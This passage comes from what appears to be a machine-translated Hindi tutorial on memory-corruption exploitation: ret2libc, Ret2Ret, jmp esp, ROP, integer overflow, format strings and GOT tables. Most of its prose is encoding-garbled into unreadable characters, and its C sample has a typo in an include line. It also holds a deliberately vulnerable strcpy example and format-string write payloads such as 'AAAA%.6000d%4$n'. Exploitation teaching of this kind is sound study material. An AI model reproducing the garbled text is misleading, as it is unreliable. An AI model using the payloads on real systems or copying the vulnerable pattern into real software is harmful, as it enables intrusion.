"A" \* DISTANCIA EBP + 4 (EBP: рдпрд╣ 4 "A" рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдпрд╣ рдмрдЧ рд╕реЗрдЧрдореЗрдВрдЯреЗрд╢рди рддреНрд░реБрдЯрд┐рдпреЛрдВ рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдмреЗрд╣рддрд░ рд╣реЛрдЧрд╛ рдпрджрд┐ рдпрд╣ рд╡рд╛рд╕реНрддрд╡рд┐рдХ EBP рд╣реЛ) + **system** рдХрд╛ рдкрддрд╛ (EIP рдХреЛ рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░реЗрдЧрд╛) + **exit** рдХрд╛ рдкрддрд╛ (system("/bin/sh") рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдкрд░ рдЗрд╕ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдХреНрдпреЛрдВрдХрд┐ рд╕реНрдЯреИрдХ рдХреЗ рдкрд╣рд▓реЗ 4 рдмрд╛рдЗрдЯ EIP рдХреЗ рдЕрдЧрд▓реЗ рдкрддреЗ рдХреЗ рд░реВрдк рдореЗрдВ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ) + "рдмрд┐рди / рд╢" рдХрд╛ рдкрддрд╛ (рдЗрд╕реЗ рд╕рд┐рд╕реНрдЯрдо рдХреЛ рдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдкреИрд░рд╛рдореАрдЯрд░ рд╣реЛрдЧрд╛)

рдЗрд╕ рддрд░рд╣, EIP рдХреЛ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдкрддреЗ рд╕реЗ рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЬрд┐рд╕реЗ "рдмрд┐рди / рд╢" рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ рд░реВрдк рдореЗрдВ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдЧрд╛ рдФрд░ рдЗрд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдкрд░ рдПрдХреНрдЬрд┐рдЯ() рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧрд╛ред

рдХрднреА-рдХрднреА рдХрд┐рд╕реА рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдХрд┐рд╕реА рдкрддреЗ рдХреЗ рдХрд┐рд╕реА рдмрд╛рдЗрдЯ рдХреЛ рд╢реВрдиреНрдп рдпрд╛ рд╕реНрдерд╛рди (\x20) рдорд┐рд▓ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рдЙрд╕ рдлрд╝рдВрдХреНрд╢рди рд╕реЗ
## **5.рдЕрддрд┐рд░рд┐рдХреНрдд рд╡рд┐рдзрд┐рдпрд╛рдБ**

**Ret2Ret**

рдпрд╣ рдЙрдкрдпреЛрдЧреА рд╣реЛрддрд╛ рд╣реИ рдЬрдм EIP рдореЗрдВ рд╕реНрдЯреИрдХ рдХрд╛ рдкрддрд╛ рдирд╣реАрдВ рдбрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ (EIP рдореЗрдВ 0xbf рдирд╣реАрдВ рд╣реЛрдирд╛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ) рдпрд╛ рдЬрдм рд╢реЗрд▓рдХреЛрдб рдХреА рд╕реНрдерд╛рди рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рд▓реЗрдХрд┐рди, рдпрджрд┐ рд╡рд┐рдХрд▓реНрдкреАрдп рдлрд╝рдВрдХреНрд╢рди рдПрдХ рдкреИрд░рд╛рдореАрдЯрд░ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддреА рд╣реИ (рдпрд╣рд╛рдВ рд╢реЗрд▓рдХреЛрдб рдЬрд╛рдПрдЧрд╛)ред

рдЗрд╕ рддрд░рд╣, EIP рдХреЛ рдПрдХ **ret** рдХреЗ рдкрддреЗ рд╕реЗ рдмрджрд▓рдХрд░, рдЕрдЧрд▓рд╛ рдкрддрд╛ рд▓реЛрдб рд╣реЛрдЧрд╛ (рдЬреЛ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдкрд╣рд▓реЗ рддрд░реНрдХ рдХрд╛ рдкрддрд╛ рд╣реИ)ред рдЕрд░реНрдерд╛рдд, рд╢реЗрд▓рдХреЛрдб рд▓реЛрдб рд╣реЛрдЧрд╛ред

рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рд╣реЛрдЧрд╛: SHELLCODE + рднрд░рд╛рдИ (EIP рддрдХ) + **\&ret** (рдкрд╛рдЗрд▓ рдХреЗ рдЕрдЧрд▓реЗ рдмрд╛рдЗрдЯреНрд╕ рд╢реЗрд▓рдХреЛрдб рдХреА рд╢реБрд░реБрдЖрдд рдкрд░ рдкреЙрдЗрдВрдЯ рдХрд░рддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рд╕реНрдЯреИрдХ рдореЗрдВ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рдкрддреЗ рдХреЛ рдбрд╛рд▓рд╛ рдЬрд╛рддрд╛ рд╣реИ)

рдРрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ **strncpy** рдЬреИрд╕реЗ рдлрд╝рдВрдХреНрд╢рдиреНрд╕ рдкреВрд░реНрдг рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж рд╢реЗрд▓рдХреЛрдб рдХреЛ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдкрддреЗ рдХреЛ рд╕реНрдЯреИрдХ рд╕реЗ рд╣рдЯрд╛ рджреЗрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рддрдХрдиреАрдХ рдЕрд╕рдВрднрд╡ рд╣реЛ рдЬрд╛рддреА рд╣реИред рдЕрд░реНрдерд╛рдд, рд╡реЗ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдПрдХ рддрд░реНрдХ рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╛рд╕ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдкрддреЗ (рдЬреЛ рд╢реЗрд▓рдХреЛрдб рдХреЛ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рддрд╛ рд╣реИ) рдХреЛ 0x00 рджреНрд╡рд╛рд░рд╛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рджреЗрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рджреВрд╕рд░реЗ **ret** рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдкрд░ рд╡рд╣ 0x00 рдХреЗ рд╕рд╛рде рдЦреБрдж рдХреЛ рдкрд╛рддрд╛ рд╣реИ рдФрд░ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдмрдВрдж рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред
```
**Ret2PopRet**
```
рдпрджрд┐ рд╣рдо рдкрд╣рд▓реЗ рддрд░реНрдХ рдкрд░ рдирд┐рдпрдВрддреНрд░рдг рдирд╣реАрдВ рд░рдЦрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рджреВрд╕рд░реЗ рдпрд╛ рддреАрд╕рд░реЗ рддрд░реНрдХ рдкрд░ рд╣рдорд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рдг рд╣реЛрддрд╛ рд╣реИ, рддреЛ рд╣рдо рдИрдЖрдИрдкреА рдХреЛ рдкреЙрдк-рд░реЗрдЯ рдпрд╛ рдкреЙрдк-рдкреЙрдк-рд░реЗрдЯ рдХреЗ рдПрдХ рдкрддреЗ рдХреЗ рд╕рд╛рде рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреИрд╕рд╛ рдХрд┐ рд╣рдореЗрдВ рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред

**рдореБрд░рд╛рдд рдХреА рддрдХрдиреАрдХ**

рд▓рд┐рдирдХреНрд╕ рдореЗрдВ рд╕рднреА рдкреНрд░реЛрдЧреНрд░рд╛рдо 0xbfffffff рд╕реЗ рд╢реБрд░реВ рд╣реЛрддреЗ рд╣реИрдВ

рд▓рд┐рдирдХреНрд╕ рдореЗрдВ рдПрдХ рдирдП рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд╕реНрдЯреИрдХ рдХреЛ рдХреИрд╕реЗ рдирд┐рд░реНрдорд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рджреЗрдЦрдХрд░, рд╣рдо рдПрдХ рдРрд╕рд╛ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рд╡рд┐рдХрд╕рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдПрдХ рдРрд╕реЗ рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдХреЗрд╡рд▓ рд╢реЗрд▓рдХреЛрдб рд╣реА рдПрдХрдорд╛рддреНрд░ рдЪрд░ рд╣реЛрддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдкрддрд╛ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдирд┐рдХрд╛рд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ: addr = 0xbfffffff - 4 - strlen(NOMBRE\_ejecutable\_completo) - strlen(shellcode)

рдЗрд╕ рддрд░рд╣, рд╢реЗрд▓рдХреЛрдб рдХреЗ рд╕рд╛рде рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдЪрд░ рдХреА рд╕реНрдерд╛рдиреАрдпрддрд╛ рдХрд╛ рдПрдХ рд╕рд░рд▓ рдкрддрд╛ рдкреНрд░рд╛рдкреНрдд рд╣реЛрдЧрд╛ред

рдпрд╣ рдХрд╛рд░реНрдп execle рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдХрд╛рд░рдг рд╕рдВрднрд╡ рд╣реИ, рдЬреЛ рдХреЗрд╡рд▓ рд╡реЗ рд╡рд╛рддрд╛рд╡рд░рдг рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рдирдореЗрдВ рдХреЗрд╡рд▓ рд╡реЗ рд╡рд╛рддрд╛рд╡рд░рдгреАрдп рдЪрд░ рд╣реЛрдВ рдЬреЛ рдЪрд╛рд╣рд┐рдПред

**ESP рдкрд░ рдЬрдВрдк: рд╡рд┐рдВрдбреЛрдЬ рд╕реНрдЯрд╛рдЗрд▓**

рдХреНрдпреЛрдВрдХрд┐ рдИрдПрд╕рдкреА рд╣рдореЗрд╢рд╛ рд╕реНрдЯреИрдХ рдХреА рд╢реБрд░реБрдЖрдд рдкрд░ рдкреЙрдЗрдВрдЯ рдХрд░ рд░рд╣рд╛ рд╣реИ, рдЗрд╕ рддрдХрдиреАрдХ рдореЗрдВ рдИрдЖрдИрдкреА рдХреЛ **jmp esp** рдпрд╛ **call esp** рдХреЗ рдПрдХ рдкрддреЗ рдХреЗ рд╕рд╛рде рдмрджрд▓ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕ рддрд░рд╣, рдИрдЖрдИрдкреА рдХреЗ рдЕрдзрд┐рд▓реЗрдЦрди рдХреЗ рдмрд╛рдж рд╢реЗрд▓рдХреЛрдб рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ **ret** рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж рдИрдПрд╕рдкреА рдЕрдЧрд▓реЗ рдкрддреЗ рдкрд░ рдкреЙрдЗрдВрдЯ рд╣реЛрдЧрд╛, рдЬрд╣рд╛рдВ рд╢реЗрд▓рдХреЛрдб рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

рдпрджрд┐ рд╡рд┐рдВрдбреЛрдЬ рдпрд╛ рд▓рд┐рдирдХреНрд╕ рдореЗрдВ ASLR рд╕рдХреНрд░рд┐рдп рдирд╣реАрдВ рд╣реИ, рддреЛ рдХрд┐рд╕реА рд╕рд╛рдЭрд╛ рдСрдмреНрдЬреЗрдХреНрдЯ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд **jmp esp** рдпрд╛ **call esp** рдХреЛ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрджрд┐ ASLR рд╣реИ, рддреЛ рдЗрд╕реЗ рдЦреБрдж рдХреЗ рд╡рд┐рдХрд▓реНрдкреА рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЗ рднреАрддрд░ рдЦреЛрдЬрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдИрдЖрдИрдкреА рдХреЗ рдЕрдзрд┐рд▓реЗрдЦрди рдХреЗ рдмрд╛рдж рд╢реЗрд▓рдХреЛрдб рдХреЛ рд╕реНрдЯреИрдХ рдХреЗ рдмреАрдЪ рдореЗрдВ рд░рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рд╕реЗ, рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдмреАрдЪ рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдкреБрд╢ рдпрд╛ рдкреЙрдк рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдПрдБ рд╢реЗрд▓рдХреЛрдб рдХреЛ рдЫреВрдиреЗ рдХрд╛ рдХреЛрдИ рдЕрд╕рд░ рдирд╣реАрдВ рд╣реЛрдЧрд╛ (рдЬреЛ рдХрд┐ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд╕реНрдЯреИрдХ рдХреЗ рдмреАрдЪ рдореЗрдВ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ)ред

рдЗрд╕реА рддрд░рд╣, рдпрджрд┐ рд╣рдореЗрдВ рдкрддрд╛ рд╣реИ рдХрд┐ рдПрдХ рдлрд╝рдВрдХреНрд╢рди рд╢реЗрд▓рдХреЛрдб рдХреЛ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдкрддреЗ рдХреЛ рд╡рд╛рдкрд╕ рджреЗрддрд╛ рд╣реИ, рддреЛ рд╣рдо **call eax** рдпрд╛ **jmp eax (ret2eax)** рдХреЛ рдмреБрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВред

**ROP (Return Oriented Programming) рдпрд╛ рдЙрдзрд╛рд░реА рдЧрдИ рдХреЛрдб рдЯреБрдХрдбрд╝реЗ**

рдмреБрд▓рд╛рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдХреЛрдб рдЯреБрдХрдбрд╝реЗ рдХреЛ gadgets рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЗрд╕ рддрдХрдиреАрдХ рдореЗрдВ, **ret2libc** рддрдХрдиреАрдХ рдФрд░ **pop,ret** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд┐рднрд┐рдиреНрди рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдмреБрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрд▓рдЧ-рдЕрд▓рдЧ рдХреЙрд▓ рдХреЛ рдЬреЛрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИред

рдХреБрдЫ рдкреНрд░реЛрд╕реЗрд╕рд░ рдЖрд░реНрдХрд┐рдЯреЗрдХреНрдЪрд░ рдореЗрдВ рдкреНрд░рддреНрдпреЗрдХ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ 32 рдмрд┐рдЯ рдХрд╛ рд╣реЛрддрд╛ рд╣реИ (рдЬреИрд╕реЗ MIPS)ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрдВрдЯреЗрд▓ рдореЗрдВ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдПрдБ рдЪрд░ рдХреА рдЖрдХрд╛рд░ рд╡рд┐рднрд┐рдиреНрди рд╣реЛрддреА рд╣реИрдВ рдФрд░ рдХрдИ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдПрдБ рдПрдХ рд╣реА рдмрд┐рдЯ рд╕реЗрдЯ рдХреЛ рд╕рд╛рдЭрд╛ рдХрд░ рд╕рдХрддреА рд╣реИрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:

**movl $0xe4ff, -0x(%ebp)** тАФ> рдЗрд╕рдореЗрдВ 0xffe4 рдмрд╛рдЗрдЯреНрд╕ рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ рдЗрд╕реА рддрд░рд╣ рд╕реЗ рдЕрдиреБрд╡рд╛рджрд┐рдд рд╣реЛрддреЗ рд╣реИрдВ: **jmp \*%esp**

рдЗрд╕ рддрд░рд╣, рдХреБрдЫ рдРрд╕реЗ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдПрдБ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ рдЬреЛ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдореВрд▓ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдореЗрдВ рдирд╣реАрдВ рд╣реИрдВ

**ROPgadget.py** рд╣рдореЗрдВ рдмрд╛рдЗрдирд░реА рдореЗрдВ рдорд╛рди рдЦреЛрдЬрдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддрд╛ рд╣реИ

рдпрд╣ рдкреНрд░реЛрдЧреНрд░рд╛рдо рднреА **рдкреЗрд▓реЛрдб** рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реИред рдЖрдк рдЙрд╕реЗ рдЙрд╕ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЗ рджреНрд╡рд╛рд░рд╛ рджреЗрдВ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рд╕реЗ рдЖрдк ROPs рдирд┐рдХрд╛рд▓рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдФрд░ рд╡рд╣ рдПрдХ рдкреЗрд▓реЛрдб рдкрд╛рдпрдерди рдореЗрдВ рдЙрддреНрдкрдиреНрди рдХрд░реЗрдЧрд╛, рдЬрд┐рд╕реЗ рдЖрдк рдЙрд╕ рдкрддреЗ рдХреЗ рд░реВрдк рдореЗрдВ рджреЗрдВрдЧреЗ рдЬрд╣рд╛рдВ рдЙрд╕ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреА рд╕реНрдерд┐рддрд┐ рд╣реИ рдФрд░ рдкреЗрд▓реЛрдб рдкрд╣рд▓реЗ рд╕реЗ рддреИрдпрд╛рд░ рд╣реЛ рдЬрд╛рдПрдЧрд╛ рдЬреИрд╕реЗ рд╢реЗрд▓рдХреЛрдб рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рдХреЗ рд▓рд┐рдПред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрд╣ рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИ рдЗрд╕рд▓рд┐рдП рдпрд╣ рд╕реНрдЯреИрдХ рдкрд░ рдХреБрдЫ рдирд╣реАрдВ рдЪрд▓рд╛рддрд╛ рд╣реИ, рдмрд▓реНрдХрд┐ рдХреЗрд╡рд▓ ROPs рдХреЗ рдкрддреЛрдВ рдХреЛ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рддрд╛ рд╣реИ рдЬреЛ **ret** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдВрдЧреЗред рдЗрд╕ рдкреЗрд▓реЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ рдПрдХ **ret** рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреЗрд▓реЛрдб рдХреЛ рдмреБрд▓рд╛рдирд╛ рд╣реЛрдЧрд╛ред

**рдЗрдВрдЯреАрдЬрд░ рдУрд╡рд░рдлрд╝реНрд▓реЛрдЬрд╝**

рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рдУрд╡рд░рдлрд╝реНрд▓реЛрдЬрд╝ рдЙрд╕ рд╕рдордп рд╣реЛрддреЗ рд╣реИрдВ рдЬрдм рдПрдХ рдЪрд░ рдЗрддрдиреЗ рдмрдбрд╝реЗ рдирдВрдмрд░ рдХреЛ рд╕рд╣рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рддреИрдпрд╛рд░ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ, рд╕рдВрдХреЗрддреЛрдВ рдХреЗ рд╕рд╛рде рдФрд░ рдмрд┐рдирд╛ рд╕рдВрдХреЗрддреЛрдВ рдХреЗ рдЪрд░реЛрдВ рдХреЗ рдмреАрдЪ рдЧрд▓рддрдлрд╣рдореА рдХреЗ рдХрд╛рд░рдг рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
## **рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ**

рд╕реА рдореЗрдВ **`printf`** рдПрдХ рдРрд╕реА рдлрд╝рдВрдХреНрд╢рди рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рд╕реА рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ **рдкреНрд░рд┐рдВрдЯ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕ рдлрд╝рдВрдХреНрд╢рди рдХреА **рдкрд╣рд▓реА рдкреИрд░рд╛рдореАрдЯрд░** рдЙрдореНрдореАрдж рдХрд░рддреА рд╣реИ рдХрд┐ рдпрд╣ **рд░реЙ рдЯреЗрдХреНрд╕реНрдЯ рд╣реЛрдЧрд╛ рдЬрд┐рд╕рдореЗрдВ рдлреЙрд░реНрдореЗрдЯрд░реНрд╕** рд╣реЛрдВрдЧреЗред рдЖрдЧреЗ рдХреА рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдЙрдореНрдореАрдж рдХрд░рддреА рд╣реИрдВ рдХрд┐ рдпреЗ **рдлрд╝реЙрд░реНрдореЗрдЯрд░реНрд╕ рдХреЛ рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдорд╛рди** рд╣реЛрдВрдЧреЗ рд░реЙ рдЯреЗрдХреНрд╕реНрдЯ рд╕реЗред

рдпрд╣ рд╕рдВрдХрдЯ рдЙрддреНрдкрдиреНрди рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдПрдХ **рд╣рдорд▓рд╛рд╡рд░реНрддреА рдЯреЗрдХреНрд╕реНрдЯ рдХреЛ рдкрд╣рд▓реА рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд░реВрдк рдореЗрдВ** рдЗрд╕ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдкрд╛рда рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рд╣рдорд▓рд╛рд╡рд░реНрддреА рд╡реНрдпрдХреНрддрд┐ рдХреЛ **рд╡рд┐рд╢реЗрд╖ рдЗрдирдкреБрдЯ рддреИрдпрд╛рд░ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИ** рдЬреЛ **printf рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ** рдХреА рдХреНрд╖рдорддрд╛рдУрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рд╕реА рднреА рдкрддреЗ рдореЗрдВ рдХрд┐рд╕реА рднреА рдбреЗрдЯрд╛ рдХреЛ **рд▓рд┐рдЦрдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдЗрд╕ рддрд░реАрдХреЗ рд╕реЗ рд╡реЗ **рд╡рд┐рдЪрд╛рд░рд╢реАрд▓ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдлреЙрд░реНрдореЗрдЯрд░реНрд╕:
```bash
%08x тАФ> 8 hex bytes
%d тАФ> Entire
%u тАФ> Unsigned
%s тАФ> String
%n тАФ> Number of written bytes
%hn тАФ> Occupies 2 bytes instead of 4
<n>$X тАФ> Direct access, Example: ("%3$d", var1, var2, var3) тАФ> Access to var3
```
**`%n`** **рдЗрдВрджрд┐рдХреАрдп рдкрддреЗ рдореЗрдВ рд▓рд┐рдЦрддрд╛ рд╣реИ**ред рдЬрд┐рддрдиреЗ **рдмрд╛рдЗрдЯ** рд╣рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рдЙрд╕реА рд╣реЗрдХреНрд╕ рдирдВрдмрд░ рдХреЗ рд░реВрдк рдореЗрдВ **рдбреЗрдЯрд╛ рд▓рд┐рдЦрдиреЗ** рдХреЗ рд▓рд┐рдП рд╣рдореЗрдВ рдЙрд╕реА рдХрджрдо рдХреЛ рдЪрд▓рд╛рдирд╛ рд╣реЛрддрд╛ рд╣реИред
```bash
AAAA%.6000d%4\$n тАФ> Write 6004 in the address indicated by the 4┬║ param
AAAA.%500\$08x тАФ> Param at offset 500
```
### GOT (Global Offsets Table) / PLT (Procedure Linkage Table)

рдпрд╣ рдЯреЗрдмрд▓ рдкреНрд░реЛрдЧреНрд░рд╛рдо рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА **рдмрд╛рд╣рд░реА рдлрдВрдХреНрд╢рдиреЛрдВ** рдХреЗ **рдкрддреЗ** рдХреЛ рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХрд░рддрд╛ рд╣реИред

рдЗрд╕ рддрд╛рд▓рд┐рдХрд╛ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдВ: **`objdump -s -j .got ./exec`**

![](<../../.gitbook/assets/image (619).png>)

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **GEF рдореЗрдВ** **executable** рдХреЛ **рд▓реЛрдб** рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж рдЖрдк **GOT** рдореЗрдВ рдореМрдЬреВрдж **рдлрдВрдХреНрд╢рдиреЛрдВ** рдХреЛ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ: `gefтЮд x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

